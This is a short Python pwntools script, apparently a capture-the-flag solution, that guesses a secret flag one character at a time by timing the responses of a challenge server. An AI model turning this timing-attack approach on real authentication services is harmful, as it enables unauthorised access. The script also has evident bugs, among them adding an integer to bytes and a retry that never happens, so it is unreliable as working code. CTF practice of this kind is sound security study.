from pwn import *
import timeit

flag = b""
charset = b"{}abcdefghijklmnopqrstuvwxyz_"

# Outer loop goes for each additional character
while(True):
    # Inner loop goes over each potential character
    max_time = 0
    max_char = b""
    for i in range(len(charset)):   
        avg_time = 0
        for j in range(5):
            try:
                p = remote("0.cloud.chals.io", 29427)
                p.recvuntil(b"\n")
                start = timeit.default_timer()
                p.sendline(flag + charset[i].to_bytes(1, 'little'))
                p.recvuntil(b"]")
                stop = timeit.default_timer()
                avg_time += stop - start
                res = p.recvline()
                if b"Granted" in res:
                    print(f"Final flag: {flag + i}")
                    exit()
            except:
                j -= 1
                continue
        avg_time /= 5
        if max_time < avg_time:
                max_time = avg_time
                max_char = charset[i]
        p.close()
    flag += max_char.to_bytes(1, 'little')
    print(f"Update: {flag}")
